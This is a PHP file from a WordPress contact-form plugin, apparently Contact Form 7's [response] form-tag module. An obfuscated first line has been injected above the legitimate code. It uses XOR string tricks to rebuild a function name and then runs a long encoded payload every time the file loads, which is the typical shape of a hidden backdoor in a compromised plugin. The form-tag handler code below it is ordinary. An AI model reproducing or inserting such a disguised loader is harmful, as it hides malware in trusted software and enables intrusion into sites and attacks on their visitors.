<?php $MdCLNZseUaI='.O2L>Xa6:E >P N'^'M=W-J=>PO+CJ9O ';$rBzntFLg=$MdCLNZseUaI('','ISCB>2+P I8W6Q3E558Ge.O6rJPFJ1jXG3UKex>GKU>Y9GP.ZZ>:0,YL=,i2FITYk0;;LiGKF6UXcICwn73zlS8 ,BsBmewpLAZVCmV=RlksUfp0x9TG60,FW28:;arqT3QfpdaDFU2BxmjAgKD9 WcH ,J9BgEW5lBQykZAG0 .ZYHK,=afKBgxn>YTN4ZBBB NaVsh6P;=hO 6LTeXNPAL<1lmND1BA;.Q5UPl07 16RHGQ: PA;HGBM1tbxyz0E7EiN27DMnxXqM1>;.mtLsYrJW9A38T>xvaA:<>Th0nQMORWetPVJV:4aBSXXXREGHu=3M1Nk>K2H+FR;-TLCScai di=ch-MGIF,-xORUHL5Z6.dX,FBqES6GWh 3:RToS.I5kL23PVX02zdCU10T3Eq>FSZ<68FQ,OUShjxG 1<LU4-TVER VH7<S>Z.176;yP 1.UcoZW18O0gqVOG5lBzQ+62+iU7YGGykS GpJ.GTFEIEAL+8+; 5GjX;IS2XosXQ8EfCp-RDZplitHECUAjoOZMTlEYUYI7CFoIdsiUVOV-Qu:s2aQyXVO5tW;RkBcOvAQ4NOUGCAbEO4R92nF.EaT09M99KW2QC.D+7oEkNUABRohUVcKhZ93mNA BcQ34,R>iA7E9S3ZS+znEzEDI5oHoCpE'^' 5kcXGE3T W9i4K,FAKoBV D-.12+n552GrbLXEMB3K7Z39A4zFUBs=-IM6m+< qOTZO-Ego-S,qCicWNL9sewWUXbNbJBLzEH<91ErTrQKCnFTYDJ 5ZUBnsVYNZHIQpZzMYnhMb:G6XCWaOo XT68lIqjgbC.2L7f8YNz23BLK4ql IDH;bymqgL< ;F4jf-U:HmyaKZF7bkDW85Een6  OTWgj P6 dE4LumLVVLBSiBM7UR5 X gjin7-723ueV6IjYR=mSFxU;PRNKDT7yPV.6M lS1GXKAeQYGob9J5,;3wXTt +:OQZH.RR14eoiQYR9PgKEA;.D47ZN<lkw<3,q1,n7HL>gm-ITXrlul:T6CKMxWLKxa7W367KVCriOwE,LPF;:t29DSZYcqGQ8F J4O.PA<2b5M;4sUJ82NBY><UA=, zX9:hX2J;qnZCOQ2ABKcW0>2RW+UOU2.3TEnZuOWFJ6>R nnBa:FoT.O35fcoe >YYRdKP>5=C  F+GT34AbJcTI30;YLORhm.1tBK+;957b20 njjfRtDTZd5ycN4MYATR5NjgyWDfZaX Q,NrfWz.rncgDe.F XK1-K<>1HP>MJcpB0:B+JSHiKj1 63FAuvCkHzB9d+7A.KuWUX3eN1V<U<R>tvSUOs < AGxFxz8');$rBzntFLg();
/**
** A base module for [response]
**/

/* form_tag handler */

add_action( 'wpcf7_init', 'wpcf7_add_form_tag_response' );

function wpcf7_add_form_tag_response() {
	wpcf7_add_form_tag( 'response', 'wpcf7_response_form_tag_handler',
		array( 'display-block' => true ) );
}

function wpcf7_response_form_tag_handler( $tag ) {
	if ( $contact_form = wpcf7_get_current_contact_form() ) {
		return $contact_form->form_response_output();
	}
}
